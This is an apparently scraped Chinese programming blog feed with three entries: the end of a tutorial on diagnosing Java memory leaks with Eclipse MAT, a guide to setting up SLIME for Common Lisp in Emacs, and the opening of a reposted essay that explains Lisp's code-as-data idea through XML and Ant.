<h3 id="配置环境参数"><a href="#配置环境参数" class="headerlink" title="配置环境参数"></a>配置环境参数</h3><p>安装完成之后，为了更有效率的使用MAT，我们还需要做一些配置工作。因为通常而言，分析一个堆转储文件需要消耗很多的堆空间，为了保证分析的效率和性能，在有条件的情况下，我们会建议分配给MAT 尽可能多的内存资源。你可以采用如下两种方式来分配内存更多的内存资源给MAT。</p>
<p>一种是修改启动参数 MemoryAnalyzer.exe -vmargs -Xmx4g</p>
<p>另一种是编辑文件 MemoryAnalyzer.ini，在里面添加类似信息 -vmargs –Xmx4g。</p>
<p>至此，MAT 就已经成功地安装配置好了，开始进入实战吧。</p>
<h3 id="获得堆转储文件"><a href="#获得堆转储文件" class="headerlink" title="获得堆转储文件"></a>获得堆转储文件</h3><p>巧妇难为无米之炊，我们首先需要获得一个堆转储文件。为了方便，本文采用的是Sun JDK 6。通常来说，只要你设置了如下所示的 JVM 参数：</p>
<p>-XX:+HeapDumpOnOutOfMemoryError</p>
<p>JVM就会在发生内存泄露时抓拍下当时的内存状态，也就是我们想要的堆转储文件。</p>
<p>如果你不想等到发生崩溃性的错误时才获得堆转储文件，也可以通过设置如下 JVM参数来按需获取堆转储文件。</p>
<p>-XX:+HeapDumpOnCtrlBreak</p>
<p>除此之外，还有很多的工具，例如<br><a href="http://java.sun.com/j2se/1.5.0/docs/tooldocs/share/jmap.html">JMap</a>，JConsole都可以帮助我们得到一个堆转储文件。本文实例就是使用 JMap 直接获取了Eclipse Galileo 进程的堆转储文件。您可以使用如下命令：</p>
<p>JMap -dump:format&#x3D;b,file&#x3D;&lt;dumpfile&gt; &lt;pid&gt;</p>
<p>不过，您需要了解到，不同厂家的 JVM所生成的堆转储文件在数据存储格式以及数据存储内容上有很多区别， MAT不是一个万能工具，它并不能处理所有类型的堆存储文件。但是比较主流的厂家和格式，例如Sun, HP, SAP 所采用的 HPROF 二进制堆存储文件，以及 IBM 的 PHD堆存储文件等都能被很好的解析（您需要安装额外的插件，请参考<a href="http://www.ibm.com/developerworks/java/jdk/tools/dtfj.html">相关说明</a>，本文不作详细解释）。</p>
<p>万事俱备，接下来，我们就可以开始体验一键式的堆存储分析功能了。</p>
<h2 id="生成分析报告"><a href="#生成分析报告" class="headerlink" title="生成分析报告 "></a>生成分析报告 </h2><p>首先，启动前面安装配置好的 Memory Analyzer tool , 然后选择菜单项 File-Open Heap Dump来加载需要分析的堆转储文件。文件加载完成后，你可以看到如图 4所示的界面：</p>
<h5 id="图-4-概览"><a href="#图-4-概览" class="headerlink" title="图 4. 概览"></a>图 4. 概览</h5><p><img src="/images/janalyzer/image004.jpg" alt="图 4. 概览">{width&#x3D;”576”}</p>
<p>通过上面的概览，我们对内存占用情况有了一个总体的了解。先检查一下 MAT生成的一系列文件。</p>
<h5 id="图-5-文件列表"><a href="#图-5-文件列表" class="headerlink" title="图 5. 文件列表"></a>图 5. 文件列表</h5><p><img src="/images/janalyzer/image005.jpg" alt="图 5. 文件列表">{width&#x3D;”331”}</p>
<p>可以看到 MAT 工具提供了一个很贴心的功能，将报告的内容压缩打包到一个 zip文件，并把它存放到原始堆转储文件的存放目录下，这样如果您需要和同事一起分析这个内存问题的话，只需要把这个小小的zip 包发给他就可以了，不需要把整个堆文件发给他。并且整个报告是一个 HTML<br>格式的文件，用浏览器就可以轻松打开。</p>
<p>接下来我们就可以来看看生成的报告都包括什么内容，能不能帮我们找到问题所在吧。您可以点击工具栏上的Leak Suspects 菜单项来生成内存泄露分析报告，也可以直接点击饼图下方的Reports-&gt;Leak Suspects 链接来生成报告。</p>
<h5 id="图-6-工具栏菜单"><a href="#图-6-工具栏菜单" class="headerlink" title="图 6. 工具栏菜单"></a>图 6. 工具栏菜单</h5><p><img src="/images/janalyzer/image006.jpg" alt="图 6. 工具栏菜单">{width&#x3D;”301”}</p>
<h2 id="分析三步曲"><a href="#分析三步曲" class="headerlink" title="分析三步曲 "></a>分析三步曲 </h2><p>通常我们都会采用下面的”三步曲”来分析内存泄露问题：</p>
<p>首先，对问题发生时刻的系统内存状态获取一个整体印象。</p>
<p>第二步，找到最有可能导致内存泄露的元凶，通常也就是消耗内存最多的对象</p>
<p>接下来，进一步去查看这个内存消耗大户的具体情况，看看是否有什么异常的行为。</p>
<p>下面将用一个基本的例子来展示如何采用”三步曲”来查看生产的分析报告。</p>
<h3 id="查看报告之一：内存消耗的整体状况"><a href="#查看报告之一：内存消耗的整体状况" class="headerlink" title="查看报告之一：内存消耗的整体状况"></a>查看报告之一：内存消耗的整体状况</h3><h5 id="图-7-内存泄露分析报告"><a href="#图-7-内存泄露分析报告" class="headerlink" title="图 7. 内存泄露分析报告"></a>图 7. 内存泄露分析报告</h5><p><img src="/images/janalyzer/image007.jpg" alt="图 7. 内存泄露分析报告">{width&#x3D;”576”}</p>
<p>如图 7所示，在报告上最醒目的就是一张简洁明了的饼图，从图上我们可以清晰地看到一个可疑对象消耗了系统99% 的内存。</p>
<p>在图的下方还有对这个可疑对象的进一步描述。我们可以看到内存是由java.util.Vector 的实例消耗的，com.ibm.oti.vm.BootstrapClassLoader负责这个对象的加载。这段描述非常短，但我相信您已经可以从中找到很多线索了，比如是哪个类占用了绝大多数的内存，它属于哪个组件等等。</p>
<p>接下来，我们应该进一步去分析问题，为什么一个 Vector 会占据了系统 99%的内存，谁阻止了垃圾回收机制对它的回收。</p>
<h3 id="查看报告之二：分析问题的所在"><a href="#查看报告之二：分析问题的所在" class="headerlink" title="查看报告之二：分析问题的所在"></a>查看报告之二：分析问题的所在</h3><p>首先我们简单回顾下 JAVA的内存回收机制，内存空间中垃圾回收的工作由垃圾回收器 (Garbage Collector,GC)完成的，它的核心思想是：对虚拟机可用内存空间，即堆空间中的对象进行识别，如果对象正在被引用，那么称其为存活对象，反之，如果对象不再被引用，则为垃圾对象，可以回收其占据的空间，用于再分配。</p>
<p>在垃圾回收机制中有一组元素被称为根元素集合，它们是一组被虚拟机直接引用的对象，比如，正在运行的线程对象，系统调用栈里面的对象以及被system class loader所加载的那些对象。堆空间中的每个对象都是由一个根元素为起点被层层调用的。因此，一个对象还被某一个存活的根元素所引用，就会被认为是存活对象，不能被回收，进行内存释放。因此，我们可以通过分析一个对象到根元素的引用路径来分析为什么该对象不能被顺利回收。如果说一个对象已经不被任何程序逻辑所需要但是还存在被根元素引用的情况，我们可以说这里存在内存泄露。</p>
<p>现在，让我们开始真正的寻找内存泄露之旅，点击”Details “链接，可以看到如图8 所示对可疑对象 1 的详细分析报告。</p>
<h5 id="图-8-可疑对象-1-的详细分析报告"><a href="#图-8-可疑对象-1-的详细分析报告" class="headerlink" title="图 8. 可疑对象 1 的详细分析报告"></a>图 8. 可疑对象 1 的详细分析报告</h5><p><img src="/images/janalyzer/image008.jpg" alt="图 8. 可疑对象 1的详细分析报告">{width&#x3D;”557”}</p>
<ol>
<li>我们查看下从 GC 根元素到内存消耗聚集点的最短路径：</li>
</ol>
<h5 id="图-9-从根元素到内存消耗聚集点的最短路径"><a href="#图-9-从根元素到内存消耗聚集点的最短路径" class="headerlink" title="图 9. 从根元素到内存消耗聚集点的最短路径"></a>图 9. 从根元素到内存消耗聚集点的最短路径</h5><p><img src="/images/janalyzer/image009.jpg" alt="图 9.从根元素到内存消耗聚集点的最短路径">{width&#x3D;”576”}</p>
<p>我们可以很清楚的看到整个引用链，内存聚集点是一个拥有大量对象的集合，如果你对代码比较熟悉的话，相信这些信息应该能给你提供一些找到内存泄露的思路了。</p>
<p>接下来，我们再继续看看，这个对象集合里到底存放了什么，为什么会消耗掉如此多的内存。</p>
<h5 id="图-10-内存消耗聚集对象信息"><a href="#图-10-内存消耗聚集对象信息" class="headerlink" title="图 10. 内存消耗聚集对象信息"></a>图 10. 内存消耗聚集对象信息</h5><p><img src="/images/janalyzer/image010.jpg" alt="图 10.内存消耗聚集对象信息">{width&#x3D;”509”}</p>
<p>在这张图上，我们可以清楚的看到，这个对象集合中保存了大量 Person对象的引用，就是它导致的内存泄露。</p>
<p>至此，我们已经拥有了足够的信息去寻找泄露点，回到代码，我们发现，是下面的代码导致了内存泄露<br>:</p>
<h5 id="清单-1-内存泄漏的代码段"><a href="#清单-1-内存泄漏的代码段" class="headerlink" title="清单 1. 内存泄漏的代码段"></a>清单 1. 内存泄漏的代码段</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while (1&lt;2) </span><br><span class="line">&#123; </span><br><span class="line">           </span><br><span class="line">    Person person = new Person(&quot;name&quot;,&quot;address&quot;,i); </span><br><span class="line">    v.add(person); </span><br><span class="line">    person = null; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结 "></a>总结 </h2><p>从上面的例子我们可以看到用 MAT来进行堆转储文件分析，寻找内存泄露非常简单，尤其是对于新手而言，这是一个很好的辅助分析工具。但是，MAT绝对不仅仅是一个”傻瓜式”内存分析工具，它还提供很多高级功能，比如 MAT支持用 OQL（Object Query Language）对 heap dump中的对象进行查询，支持对线程的分析等，有关这些功能的使用可以参考 MAT的帮助文档。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>lisp开发环境之安装slime</title>
    <url>/blog/plang/lisp/lispdiary/installslime/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Slime 的意思是“Emacs 下优秀的 Lisp 交互式开发模式”。</p>
<p>通过支持 Common Lisp 的交互式编程，Slime 扩展了 Emacs。所以的特性都基于 slime-mode，一个 Emacs 的 minor-mode，它为标准的 lisp-mode 提供补充。lisp-mode 为编辑 Lisp 源文件提供支持，而 slime-mode 则提供了与一个 Lisp 进程进行交互的功能，包括编译、调试、文档查找等等。</p>
<p>Slime 由两部分组成：用 Emacs Lisp 写的用户界面，和用 Common Lisp 写的服务器端。这两部分通过套接字连接在一起，并且使用一个类似于 RPC 的协议通信。</p>
<p>服务器端的 Lisp 主要是可移植的 Commom Lisp。所需要的跟特定 Lisp 实现相关的特性都由一个接口定义好，然后由不同的 Lisp 实现提供。这使得 Slime 非常容易移植。</p>
<p>有名的LispBox集成开发环境也只是emacs+slime+ccl+quicklisp的集成。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>你可以选择使用发行版本的 Slime 或者直接通过 CVS 仓库使用 Slime。你可以从我们的网站下载最新发布版本： <a href="http://www.common-lisp.net/project/slime/">http://www.common-lisp.net/project/slime/</a> 。</p>
<p>如果你已经有了一个可以从命令行启动的 Lisp 实现，那么仅需在 .emacs 文件中添加几行即可安装成功：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(setq inferior-lisp-program &quot;/opt/sbcl/bin/sbcl&quot;) ; your Lisp system</span><br><span class="line">(add-to-list &#x27;load-path &quot;~/hacking/lisp/slime/&quot;)  ; your SLIME directory</span><br><span class="line">(require &#x27;slime)</span><br><span class="line">(slime-setup)</span><br></pre></td></tr></table></figure>

<p>这是没有其它杂项的最小化配置。</p>
<p>在windows环境中inferior-lisp-program要指定到sbcl.exe的全路径</p>
<p>注：sbcl在window环境安装后要重新启动电脑，否则会报找不到sbcl.core的错误。</p>
<h2 id="启动-Slime"><a href="#启动-Slime" class="headerlink" title="启动 Slime"></a>启动 Slime</h2><p>Emacs 命令 M-x slime 可以启动 Slime。它使用 inferior-lisp 包来启动一个 Lisp 进程，加载并启动 Lisp 端服务器（叫做“Swank”），然后在 Emacs 和 Lisp 之间建立一个 socket 连接。最后会生成一个 REPL 缓冲区，你可以在这里输入 Lisp 表达式并求值。</p>
<h2 id="自动加载"><a href="#自动加载" class="headerlink" title="自动加载"></a>自动加载</h2><p>基本设置始终会加载 Slime，即使你不使用它。如果你只在需要的时候才加载 Slime，那么 Emacs 会启动的快一点。要这样，你需要稍微更改你的 .emacs 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(setq inferior-lisp-program &quot;the path to your Lisp system&quot;)</span><br><span class="line">(add-to-list &#x27;load-path &quot;the path of your slime directory&quot;)</span><br><span class="line">(require &#x27;slime-autoloads)</span><br><span class="line">(slime-setup)</span><br><span class="line">;让slime变得更好看，比如把sbcl的*变成CL-USER&gt;</span><br><span class="line">(slime-setup &#x27;(slime-fancy))</span><br></pre></td></tr></table></figure>

<p>跟基本配置相比，差别只在这一行 (require ‘slime-autoloads)。它告诉 Emacs 当 M-x slime 或者 M-x slime-connect 命令第一次执行之后 Slime 的其它部分会被自动加载。</p>
<p>摘选自:<a href="http://www.open-open.com/lib/view/open1400054028504.html">http://www.open-open.com/lib/view/open1400054028504.html</a></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Lisp</category>
      </categories>
      <tags>
        <tag>Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>(转)Lisp 的本质-深度好文</title>
    <url>/blog/plang/lisp/lispdiary/lispbz/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>最初在web的某些角落偶然看到有人赞美Lisp时, 我那时已经是一个颇有经验的程序员。在我的履历上,掌握的语言范围相当广泛, 象C++, Java, C#主流语言等等都不在话下,我觉得我差不多知道所有的有关编程语言的事情。对待编程语言的问题上, 我觉得自己不太会遇到什么大问题。其实我大错特错了。</p>
<p>我试着学了一下Lisp, 结果马上就撞了墙。我被那些范例代码吓坏了。我想很多初次接触Lisp语言的人, 一定也有过类似的感受。Lisp的语法太次了。一个语言的发明人, 居然不肯用心弄出一套漂亮的语法, 那谁还会愿意学它。反正, 我是确确实实被那些难看的无数的括号搞蒙了。</p>
<p>回过神来之后, 我和Lisp社区的那伙人交谈, 诉说我的沮丧心情。结果, 立马就有一大套理论砸过来, 这套理论在Lisp社区处处可见, 几成惯例。比如说: Lisp的括号只是表面现象; Lisp的代码和数据的表达方式没有差别, 而且比XML语法高明许多, 所以有无穷的好处; Lisp有强大无比的元语言能力, 程序员可以写出自我维护的代码; Lisp可以创造出针对特定应用的语言子集; Lisp的运行时和编译时没有明确的分界; 等等, 等等, 等等。这么长的赞美词虽然看起来相当动人, 不过对我毫无意义。没人能给我演示这些东西是如何应用的, 因为这些东西一般来说只有在大型系统才会用到。我争辩说, 这些东西传统语言一样办得到。在和别人争论了数个小时之后, 我最终还是放弃了学Lisp的念头。为什么要花费几个月的时间学习语法这么难看的语言呢? 这种语言的概念这么晦涩, 又没什么好懂的例子。也许这语言不是该我这样的人学的。</p>
<p>几个月来, 我承受着这些Lisp辩护士对我心灵的重压。我一度陷入了困惑。我认识一些绝顶聪明的人, 我对他们相当尊敬, 我看到他们对Lisp的赞美达到了宗教般的高度。这就是说, Lisp中一定有某种神秘的东西存在, 我不能忍受自己对此的无知, 好奇心和求知欲最终不可遏制。我于是咬紧牙关埋头学习Lisp, 经过几个月的时间费劲心力的练习, 终于,我看到了那无穷无尽的泉水的源头。在经过脱胎换骨的磨练之后, 在经过七重地狱的煎熬之后, 终于, 我明白了。</p>
<p>顿悟在突然之间来临。曾经许多次, 我听到别人引用雷蒙德(译者注: 论文&lt;&lt;大教堂和市集&gt;&gt;的作者, 著名的黑客社区理论家)的话: “Lisp语言值得学习。当你学会Lisp之后, 你会拥有深刻的体验。就算你平常并不用Lisp编程, 它也会使你成为更加优秀的程序员”。过去, 我根本不懂这些话的含义, 我也不相信这是真的。可是现在我懂得了。这些话蕴含的真理远远超过我过去的想像。我内心体会到一种神圣的情感, 一瞬间的顿悟, 几乎使我对电脑科学的观念发生了根本的改变。</p>
<p>顿悟的那一刻, 我成了Lisp的崇拜者。我体验到了宗教大师的感受: 一定要把我的知识传布开来, 至少要让10个迷失的灵魂得到拯救。按照通常的办法, 我把这些道理(就是刚开始别人砸过来的那一套, 不过现在我明白了真实的含义)告诉旁人。结果太令人失望了,只有少数几个人在我坚持之下, 发生了一点兴趣, 但是仅仅看了几眼Lisp代码, 他们就退却了。照这样的办法, 也许费数年功夫能造就了几个Lisp迷, 但我觉得这样的结果太差强人意了, 我得想一套有更好的办法。</p>
<p>我深入地思考了这个问题。是不是Lisp有什么很艰深的东西, 令得那么多老练的程序员都不能领会? 不是, 没有任何绝对艰深的东西。因为我能弄懂, 我相信其他人也一定能。那么问题出在那里? 后来我终于找到了答案。我的结论就是, 凡是教人学高级概念, 一定要从他已经懂得的东西开始。如果学习过程很有趣, 学习的内容表达得很恰当, 新概念就会变得相当直观。这就是我的答案。所谓元编程, 所谓数据和代码形式合一, 所谓自修改代码, 所谓特定应用的子语言, 所有这些概念根本就是同族概念, 彼此互为解释, 肯定越讲越不明白。还是从实际的例子出发最有用。</p>
<p>我把我的想法说给Lisp程序员听, 遭到了他们的反对。”这些东西本身当然不可能用熟悉的知识来解释, 这些概念完全与众不同, 你不可能在别人已有的经验里找到类似的东西”,可是我认为这些都是遁词。他们又反问我, “你自己为啥不试一下?” 好吧, 我来试一下。这篇文章就是我尝试的结果。我要用熟悉的直观的方法来解释Lisp, 我希望有勇气的人读完它, 拿杯饮料, 深呼吸一下, 准备被搞得晕头转向。来吧, 愿你获得大能。</p>
<h2 id="重新审视XML"><a href="#重新审视XML" class="headerlink" title="重新审视XML"></a>重新审视XML</h2><p>千里之行始于足下。让我们的第一步从XML开始。可是XML已经说得更多的了, 还能有什么新意思可说呢? 有的。XML自身虽然谈谈不上有趣, 但是XML和Lisp的关系却相当有趣。XML和Lisp的概念有着惊人的相似之处。XML是我们通向理解Lisp的桥梁。好吧, 我们且把XML当作活马医。让我们拿好手杖, 对XML的无人涉及的荒原地带作一番探险。我们要从一个全新的视角来考察这个题目。</p>
<p>表面上看, XML是一种标准化语法, 它以适合人阅读的格式来表达任意的层次化数据(hirearchical data)。象任务表(to-do list), 网页, 病历, 汽车保险单, 配置文件等等, 都是XML用武的地方。比如我们拿任务表做例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;todo name=&quot;housework&quot;&gt;</span><br><span class="line">	&lt;item priority=&quot;high&quot;&gt;Clean the house.&lt;/item&gt;</span><br><span class="line">	&lt;item priority=&quot;medium&quot;&gt;Wash the dishes.&lt;/item&gt;</span><br><span class="line">	&lt;item priority=&quot;medium&quot;&gt;Buy more soap.&lt;/item&gt;</span><br><span class="line">&lt;/todo&gt;</span><br></pre></td></tr></table></figure>

<p>解析这段数据时会发生什么情况? 解析之后的数据在内存中怎样表示? 显然, 用树来表示这种层次化数据是很恰当的。说到底, XML这种比较容易阅读的数据格式, 就是树型结构数据经过序列化之后的结果。任何可以用树来表示的数据, 同样可以用XML来表示, 反之亦然。希望你能懂得这一点, 这对下面的内容极其重要。</p>
<p>再进一步。还有什么类型的数据也常用树来表示? 无疑列表(list)也是一种。上过编译课吧? 还模模糊糊记得一点吧? 源代码在解析之后也是用树结构来存放的, 任何编译程序都会把源代码解析成一棵抽象语法树, 这样的表示法很恰当, 因为源代码就是层次结构的:函数包含参数和代码块, 代码快包含表达式和语句, 语句包含变量和运算符等等。</p>
<p>我们已经知道, 任何树结构都可以轻而易举的写成XML, 而任何代码都会解析成树, 因此,任何代码都可以转换成XML, 对不对? 我举个例子, 请看下面的函数:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int add(int arg1, int arg2)</span><br><span class="line">&#123;</span><br><span class="line">return arg1+arg2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>能把这个函数变成对等的XML格式吗? 当然可以。我们可以用很多种方式做到, 下面是其中的一种, 十分简单:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;define-function return-type=&quot;int&quot; name=&quot;add&quot;&gt;</span><br><span class="line">	&lt;arguments&gt;</span><br><span class="line">		&lt;argument type=&quot;int&quot;&gt;arg1&lt;/argument&gt;</span><br><span class="line">		&lt;argument type=&quot;int&quot;&gt;arg2&lt;/argument&gt;</span><br><span class="line">	&lt;/arguments&gt;</span><br><span class="line">	&lt;return&gt;</span><br><span class="line">		&lt;add value1=&quot;arg1&quot; value2=&quot;arg2&quot;&gt;&lt;/add&gt;</span><br><span class="line">	&lt;/return&gt;</span><br><span class="line">&lt;/define-function&gt;</span><br></pre></td></tr></table></figure>

<p>这个例子非常简单, 用哪种语言来做都不会有太大问题。我们可以把任何程序码转成XML,也可以把XML转回到原来的程序码。我们可以写一个转换器, 把Java代码转成XML, 另一个转换器把XML转回到Java。一样的道理, 这种手段也可以用来对付C++(这样做跟发疯差不多么。可是的确有人在做, 看看GCC-XML(<a href="http://www.gccxml.org)就知道了).进一步说,凡是有相同语言特性而语法不同的语言/">http://www.gccxml.org)就知道了)。进一步说,凡是有相同语言特性而语法不同的语言</a>, 都可以把XML当作中介来互相转换代码。实际上几乎所有的主流语言都在一定程度上满足这个条件。我们可以把XML作为一种中间表示法,在两种语言之间互相译码。比方说, 我们可以用Java2XML把Java代码转换成XML, 然后用XML2CPP再把XML转换成C++代码, 运气好的话, 就是说, 如果我们小心避免使用那些C++不具备的Java特性的话, 我们可以得到完好的C++程序。这办法怎么样, 漂亮吧?</p>
<p>这一切充分说明, 我们可以把XML作为源代码的通用存储方式, 其实我们能够产生一整套使用统一语法的程序语言, 也能写出转换器, 把已有代码转换成XML格式。如果真的采纳这种办法, 各种语言的编译器就用不着自己写语法解析了, 它们可以直接用XML的语法解析来直接生成抽象语法树。</p>
<p>说到这里你该问了, 我们研究了这半天XML, 这和Lisp有什么关系呢? 毕竟XML出来之时,Lisp早已经问世三十年了。这里我可以保证, 你马上就会明白。不过在继续解释之前, 我们先做一个小小的思维练习。看一下上面这个XML版本的add函数例子, 你怎样给它分类,是代码还是数据? 不用太多考虑都能明白, 把它分到哪一类都讲得通。它是XML, 它是标准格式的数据。我们也知道, 它可以通过内存中的树结构来生成(GCC-XML做的就是这个事情)。它保存在不可执行的文件中。我们可以把它解析成树节点, 然后做任意的转换。显而易见, 它是数据。不过且慢, 虽然它语法有点陌生, 可它又确确实实是一个add函数,对吧?? 一旦经过解析, 它就可以拿给编译器编译执行。我们可以轻而易举写出这个XML代码解释器, 并且直接运行它。或者我们也可以把它译成Java或C++代码, 然后再编译运行。所以说, 它也是代码。</p>
<p>我们说到那里了? 不错, 我们已经发现了一个有趣的关键之点。过去被认为很难解的概念已经非常直观非常简单的显现出来。代码也是数据, 并且从来都是如此。这听起来疯疯癫癫的, 实际上却是必然之事。我许诺过会以一种全新的方式来解释Lisp, 我要重申我的许诺。但是我们此刻还没有到预定的地方, 所以还是先继续上边的讨论。</p>
<p>刚才我说过, 我们可以非常简单地实现XML版的add函数解释器, 这听起来好像不过是说说而已。谁真的会动手做一下呢? 未必有多少人会认真对待这件事。随便说说, 并不打算真的去做, 这样的事情你在生活中恐怕也遇到吧。你明白我这样说的意思吧, 我说的有没有打动你? 有哇, 那好, 我们继续。</p>
<h2 id="重新审视Ant"><a href="#重新审视Ant" class="headerlink" title="重新审视Ant"></a>重新审视Ant</h2><p>我们现在已经来到了月亮背光的那一面, 先别忙着离开。再探索一下, 看看我们还能发现什么东西。闭上眼睛, 想一想2000年冬天的那个雨夜, 一个名叫James Duncan Davidson的杰出的程序员正在研究Tomcat的servlet容器。那时, 他正小心地保存好刚修改过的文件, 然后执行make。结果冒出了一大堆错误, 显然有什么东西搞错了。经过仔细检查, 他想, 难道是因为tab前面加了个空格而导致命令不能执行吗? 确实如此。老是这样, 他真的受够了。乌云背后的月亮给了他启示, 他创建了一个新的Java项目, 然后写了一个简单但是十分有用的工具, 这个工具巧妙地利用了Java属性文件中的信息来构造工程, 现在James可以写makefile的替代品, 它能起到相同的作用, 而形式更加优美, 也不用担心有makefile那样可恨的空格问题。这个工具能够自动解释属性文件, 然后采取正确的动作来编译工程。真是简单而优美。</p>
<p>(作者注: 我不认识James, James也不认识我, 这个故事是根据网上关于Ant历史的帖子虚构的)</p>
<p>使用Ant构造Tomcat之后几个月, 他越来越感到Java的属性文件不足以表达复杂的构造指令。文件需要检出, 拷贝, 编译, 发到另外一台机器, 进行单元测试。要是出错, 就发邮件给相关人员, 要是成功, 就继续在尽可能高层的卷(volumn)上执行构造。追踪到最后,卷要回复到最初的水平上。确实, Java的属性文件不够用了, James需要更有弹性的解决方案。他不想自己写解析器(因为他更希望有一个具有工业标准的方案)。XML看起来是个不错的选择。他花了几天工夫把Ant移植到XML，于是，一件伟大的工具诞生了。</p>
<p>Ant是怎样工作的？原理非常简单。Ant把包含有构造命令的XML文件(算代码还是算数据,你自己想吧)，交给一个Java程序来解析每一个元素，实际情况比我说的还要简单得多。一个简单的XML指令会导致具有相同名字的Java类装入，并执行其代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;copy todir=&quot;../new/dir&quot;&gt;</span><br><span class="line">	&lt;fileset dir=&quot;src_dir&quot;&gt;&lt;/fileset&gt;</span><br><span class="line">&lt;/copy&gt;</span><br></pre></td></tr></table></figure>

<p>这段文字的含义是把源目录复制到目标目录，Ant会找到一个”copy”任务(实际上就是一个Java类), 通过调用Java的方法来设置适当参数(todir和fileset)，然后执行这个任务。Ant带有一组核心类, 可以由用户任意扩展, 只要遵守若干约定就可以。Ant找到这些类,每当遇到XML元素有同样的名字, 就执行相应的代码。过程非常简单。Ant做到了我们前面所说的东西: 它是一个语言解释器, 以XML作为语法, 把XML元素转译为适当的Java指令。我们可以写一个”add”任务, 然后, 当发现XML中有add描述的时候, 就执行这个add任务。由于Ant是非常流行的项目, 前面展示的策略就显得更为明智。毕竟, 这个工具每天差不多有几千家公司在使用。</p>
<p>到目前为之, 我还没有说Ant在解析XML时所遇到困难。你也不用麻烦去它的网站上去找答案了, 不会找到有价值的东西。至少对我们这个论题来说是如此。我们还是继续下一步讨论吧。我们答案就在那里。</p>
<h2 id="为什么是XML"><a href="#为什么是XML" class="headerlink" title="为什么是XML"></a>为什么是XML</h2><p>有时候正确的决策并非完全出于深思熟虑。我不知道James选择XML是否出于深思熟虑。也许仅仅是个下意识的决定。至少从James在Ant网站上发表的文章看起来, 他所说的理由完全是似是而非。他的主要理由是移植性和扩展性, 在Ant案例上, 我看不出这两条有什么帮助。使用XML而不是Java代码, 到底有什么好处? 为什么不写一组Java类, 提供api来满足基本任务(拷贝目录, 编译等等), 然后在Java里直接调用这些代码? 这样做仍然可以保证移植性, 扩展性也是毫无疑问的。而且语法也更为熟悉, 看着顺眼。那为什么要用 XML呢? 有什么更好的理由吗?</p>
<p>有的。虽然我不确定James是否确实意识到了。在语义的可构造性方面, XML的弹性是Java望尘莫及的。我不想用高深莫测的名词来吓唬你, 其中的道理相当简单, 解释起来并不费很多功夫。好, 做好预备动作, 我们马上就要朝向顿悟的时刻做奋力一跃。</p>
<p>上面的那个copy的例子, 用Java代码怎样实现呢? 我们可以这样做:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CopyTask copy = new CopyTask();</span><br><span class="line">Fileset fileset = new Fileset();</span><br><span class="line"></span><br><span class="line">fileset.setDir(&quot;src_dir&quot;);</span><br><span class="line">copy.setToDir(&quot;../new/dir&quot;);</span><br><span class="line">copy.setFileset(fileset);</span><br><span class="line"></span><br><span class="line">copy.excute();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个代码看起来和XML的那个很相似, 只是稍微长一点。差别在那里? 差别在于XML构造了一个特殊的copy动词, 如果我们硬要用Java来写的话, 应该是这个样子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy(&quot;../new/dir&quot;);</span><br><span class="line">&#123;</span><br><span class="line">    fileset(&quot;src_dir&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到差别了吗? 以上代码(如果可以在Java中用的化), 是一个特殊的copy算符, 有点像for循环或者Java5中的foreach循环。如果我们有一个转换器, 可以把XML转换到Java, 大概就会得到上面这段事实上不可以执行的代码。因为Java的技术规范是定死的, 我们没有办法在程序里改变它。我们可以增加包, 增加类, 增加方法, 但是我们没办法增加算符,而对于XML, 我们显然可以任由自己增加这样的东西。对于XML的语法树来说, 只要原意,我们可以任意增加任何元素, 因此等于我们可以任意增加算符。如果你还不太明白的话,看下面这个例子, 加入我们要给Java引入一个unless算符:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unless(someObject.canFly())</span><br><span class="line">&#123;</span><br><span class="line">    someObject.transportByGround():</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在上面的两个例子中, 我们打算给Java语法扩展两个算符, 成组拷贝文件算符和条件算符unless, 我们要想做到这一点, 就必须修改Java编译器能够接受的抽象语法树, 显然我们无法用Java标准的功能来实现它。但是在XML中我们可以轻而易举地做到。我们的解析器根据 XML元素, 生成抽象语法树, 由此生成算符, 所以, 我们可以任意引入任何算符。</p>
<p>对于复杂的算符来说, 这样做的好处显而易见。比如, 用特定的算符来做检出源码, 编译文件, 单元测试, 发送邮件等任务, 想想看有多么美妙。对于特定的题目, 比如说构造软件项目, 这些算符的使用可以大幅减低少代码的数量。增加代码的清晰程度和可重用性。解释性的XML可以很容易的达到这个目标。XML是存储层次化数据的简单数据文件, 而在Java中, 由于层次结构是定死的(你很快就会看到, Lisp的情况与此截然不同), 我们就没法达到上述目标。也许这正是Ant的成功之处呢。</p>
